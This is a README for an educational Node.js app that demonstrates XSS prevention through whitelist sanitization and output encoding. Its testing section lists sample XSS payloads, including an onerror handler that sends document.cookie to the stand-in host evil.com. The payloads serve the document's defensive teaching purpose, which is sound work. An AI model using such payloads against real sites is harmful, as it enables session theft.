# XSS Sample App - HTML Storage with XSS Protection

A Node.js application that demonstrates proper handling of XSS (Cross-Site Scripting) vulnerabilities using two different approaches: **Input Sanitization** and **Output Encoding**.

## Features

- ✅ **Two XSS Prevention Approaches**:
  - Input Sanitization (whitelist-based HTML filtering)
  - Output Encoding (display HTML as plain text)
- 📝 **HTML Storage**: Accepts HTML content via POST endpoint and stores it in files
- 🔍 **File Management**: View, list, and delete stored HTML files
- 🎨 **Interactive UI**: Beautiful web interface with two demo pages
- 📊 **Statistics**: Shows original vs sanitized content size
- 🎓 **Educational**: Side-by-side comparisons of XSS prevention techniques

## Security Implementation

The application uses **js-xss** library to sanitize all HTML input before storing it. This prevents:

- Script injection (`<script>` tags)
- Event handlers (`onerror`, `onclick`, etc.)
- JavaScript protocols (`javascript:`)
- Dangerous attributes and tags
- Data URIs and other XSS vectors

### Allowed HTML Tags

The app allows safe HTML tags only:

- Text formatting: `p`, `br`, `strong`, `em`, `u`
- Headings: `h1`, `h2`, `h3`, `h4`, `h5`, `h6`
- Lists: `ul`, `ol`, `li`
- Links: `a` (with safe attributes only)
- Containers: `div`, `span`

## Installation

1. Install dependencies:

```bash
npm install
```

## Running the Application

Start the server:

```bash
npm start
```

The server will start on `http://localhost:3000`

## Usage

### Web Interface

The application provides two interactive demo pages:

#### 1. Sanitization Demo (Main Page)

Navigate to `http://localhost:3000`

**Purpose**: Allow safe HTML rendering with formatted content
**Approach**: Input sanitization using whitelist
**Use Case**: Blog posts, articles, rich text editors

Features:

- Enter a filename and HTML content
- Try pasting malicious XSS payloads (examples provided in the UI)
- Click "Store HTML (Protected)" to save the content
- View statistics showing how many bytes were removed during sanitization
- View stored files by clicking the "View" button

#### 2. Encoding Demo

Navigate to `http://localhost:3000/encode.html`

**Purpose**: Display HTML as plain text without rendering
**Approach**: Output encoding (HTML entity conversion)
**Use Case**: Comments, usernames, displaying code examples

Features:

- Enter HTML content to encode
- See real-time HTML entity encoding
- Side-by-side comparison: unsafe vs safe display
- Click on examples to try different XSS attack vectors
- Perfect for scenarios where you want to display user input as-is without any HTML rendering

### API Endpoints

#### Store HTML Content

```bash
POST /api/store-html
Content-Type: application/json

{
  "filename": "my-document",
  "html": "<h1>Hello World</h1><script>alert('XSS')</script>"
}
```

Response:

```json
{
  "success": true,
  "message": "HTML content stored successfully",
  "filename": "my-document.html",
  "filepath": "/path/to/data/my-document.html",
  "originalLength": 58,
  "sanitizedLength": 22,
  "bytesRemoved": 36
}
```

#### List Stored Files

```bash
GET /api/files
```

Response:

```json
{
  "success": true,
  "files": ["my-document.html", "test.html"],
  "count": 2
}
```

#### View a Stored File

```bash
GET /api/view/:filename
```

Returns the sanitized HTML file.

#### Delete a Stored File

```bash
DELETE /api/delete/:filename
```

Response:

```json
{
  "success": true,
  "message": "File deleted successfully"
}
```

## Testing XSS Protection

Try these malicious payloads in the web interface - they will all be sanitized:

1. **Script Injection**:

   ```html
   <script>
     alert("XSS Attack!");
   </script>
   ```

2. **Event Handler**:

   ```html
   <img src="x" onerror="alert('XSS')" />
   ```

3. **JavaScript Protocol**:

   ```html
   <a href="javascript:alert('XSS')">Click me</a>
   ```

4. **Inline Event**:

   ```html
   <div onclick="alert('XSS')">Click here</div>
   ```

5. **Complex Attack**:
   ```html
   <img
     src="x"
     onerror="this.src='http://evil.com/steal?cookie='+document.cookie"
   />
   ```

All these attacks will be neutralized, and you'll see in the statistics how many bytes were removed.

## Project Structure

```
xss_sample/
├── server.js           # Main Express server with API endpoints
├── package.json        # Dependencies and scripts
├── public/
│   ├── index.html      # Sanitization demo (whitelist approach)
│   └── encode.html     # Encoding demo (output encoding approach)
├── data/               # Directory where HTML files are stored (created automatically)
├── .gitignore          # Git ignore file
└── README.md           # This file
```

## Dependencies

- **express**: Web framework
- **body-parser**: Parse incoming request bodies
- **xss** (js-xss): HTML sanitization library
- **fs-extra**: Enhanced file system operations

## How XSS Protection Works

### Approach 1: Input Sanitization (Whitelist)

Used in the main page (`index.html`) and server-side API:

1. **Input Validation**: Server validates that HTML and filename are provided
2. **Sanitization**: js-xss library processes the HTML using a whitelist approach
3. **Safe Storage**: Only sanitized HTML (with safe tags) is stored to the file system
4. **Secure Output**: Stored files include a visual indicator that content has been sanitized

**Best for**: Rich text content where you want to allow safe HTML formatting (bold, links, headers, etc.)

### Approach 2: Output Encoding

Used in the encoding demo page (`encode.html`):

1. **Character Conversion**: All HTML special characters are converted to HTML entities
   - `<` becomes `&lt;`
   - `>` becomes `&gt;`
   - `&` becomes `&amp;`
   - `"` becomes `&quot;`
   - `'` becomes `&#039;`
2. **Display as Text**: Browser displays the characters as text instead of executing them
3. **No HTML Rendering**: Content is shown exactly as user typed it

**Best for**: Displaying user input as plain text (comments, usernames, search terms, code examples)

### When to Use Each Approach

| Approach         | Goal                      | Use Case                        | Example                                          |
| ---------------- | ------------------------- | ------------------------------- | ------------------------------------------------ |
| **Sanitization** | Allow safe HTML to render | Blog posts, articles, rich text | `<p><strong>Hello</strong></p>` → Formatted text |
| **Encoding**     | Display HTML as text      | Comments, usernames             | `<script>alert(1)</script>` → Shown as text      |

## Key Security Features

### Input Sanitization Features

- ✅ Input validation on all endpoints
- ✅ HTML sanitization using js-xss library with whitelist approach
- ✅ Safe filename handling (removes special characters)
- ✅ Path traversal protection
- ✅ Restricted HTML tag and attribute whitelist
- ✅ No inline JavaScript execution allowed
- ✅ Statistics showing what was removed during sanitization

### Output Encoding Features

- ✅ Client-side HTML entity encoding
- ✅ Real-time encoding demonstration
- ✅ Side-by-side comparison (safe vs unsafe)
- ✅ Multiple XSS attack examples to try
- ✅ Visual representation of character conversion

## XSS Prevention Best Practices Demonstrated

This application demonstrates the two main approaches to XSS prevention:

1. **Input Sanitization (Whitelist)**: Filter dangerous content while allowing safe HTML
   - Pros: Allows rich formatting, user-friendly
   - Cons: Requires careful whitelist configuration
2. **Output Encoding**: Convert all HTML to plain text entities
   - Pros: Simple, foolproof, no HTML execution
   - Cons: No HTML formatting allowed

**Recommendation**: Use sanitization when you need formatted content, use encoding when displaying plain text. For maximum security, consider using both approaches (defense-in-depth).

## License

ISC
